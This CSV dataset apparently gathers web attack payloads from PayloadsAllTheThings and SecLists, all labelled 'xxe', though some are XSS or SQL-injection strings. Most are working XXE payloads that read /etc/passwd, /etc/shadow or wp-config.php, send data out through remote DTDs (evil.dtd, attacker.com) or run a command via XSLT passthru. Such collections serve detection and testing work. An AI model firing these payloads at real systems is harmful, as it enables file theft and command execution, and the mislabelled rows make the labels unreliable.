payload,label,source
"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xxe,payloads_all_the_things
"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xxe,payloads_all_the_things
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""utf-8""?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM ""php://filter/read-convert.base64-encode/resource=file:///C:/htdocs/wordpress/wp-config.php"" >]><doc><test>Contents of file: &xxe;</test></doc>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo><?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo> <?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM ""http://www.attacker.com/text.txt"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
}}</script><script>alert(1);</script></body></html><!--,xxe,payloads_all_the_things
"""}}</script>'",xxe,payloads_all_the_things
"}}</script>""""'""",xxe,payloads_all_the_things
"<?xml version=""1.0"" standalone=""yes""?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM ""file:///etc/passwd"" > ]><svg width=""500px"" height=""40px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1"">&xxe;</svg>",xxe,payloads_all_the_things
"<?xml version=""1.0"" standalone=""yes""?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM ""file:///etc/passwd"" > ]><svg width=""500px"" height=""100px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1""><text font-family=""Verdana"" font-size=""16"" x=""10"" y=""40"">&xxe;</text></svg>",xxe,payloads_all_the_things
<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>,xxe,payloads_all_the_things
"<!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]>",xxe,payloads_all_the_things
"<!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><test></test>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/issue"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/issue"" >]>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example.com:80"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example:443"" >]>",xxe,payloads_all_the_things
<test></test>,xxe,payloads_all_the_things
<![CDATA[<test></test>]]>,xxe,payloads_all_the_things
&foo;,xxe,payloads_all_the_things
%foo;,xxe,payloads_all_the_things
<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>,xxe,payloads_all_the_things
<foo><![CDATA[' or 1=1 or ''=']]></foo>,xxe,payloads_all_the_things
"<xml SRC=""xsstest.xml"" ID=I></xml>",xxe,payloads_all_the_things
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc"">",xxe,payloads_all_the_things
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><script>alert(123)</script></xsl:template></xsl:stylesheet>",xxe,payloads_all_the_things
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><xsl:copy-of select=""document('/etc/passwd')""/></xsl:template></xsl:stylesheet>",xxe,payloads_all_the_things
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><xsl:value-of select=""php:function('passthru','ls -la')""/></xsl:template></xsl:stylesheet>",xxe,payloads_all_the_things
"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>",xxe,payloads_all_the_things
"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]>",xxe,payloads_all_the_things
"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]>",xxe,payloads_all_the_things
"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example.com/text.txt"" >]>",xxe,payloads_all_the_things
"<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]>",xxe,payloads_all_the_things
"<!ENTITY % int ""<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  ""> %int;",xxe,payloads_all_the_things
"<!DOCTYPE xxe [ <!ENTITY % file SYSTEM ""file:///etc/issue""><!ENTITY % dtd SYSTEM ""http://example.com/evil.dtd"">%dtd;%trick;]>",xxe,payloads_all_the_things
"<!DOCTYPE xxe [ <!ENTITY % file SYSTEM ""file:///c:/boot.ini""><!ENTITY % dtd SYSTEM ""http://example.com/evil.dtd"">%dtd;%trick;]>",xxe,payloads_all_the_things
"<!ENTITY % xxe SYSTEM ""php://filter/convert.base64-encode/resource=/etc/passwd"" >",xxe,seclists
"<!ENTITY % int ""<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  ""> %int;",xxe,seclists
"<!ENTITY % param3 ""<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>"">",xxe,seclists
"<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM ""http://x.x.x.x:22/""> %dtd;]><xxx/>]]></foo></soap:Body>",xxe,seclists
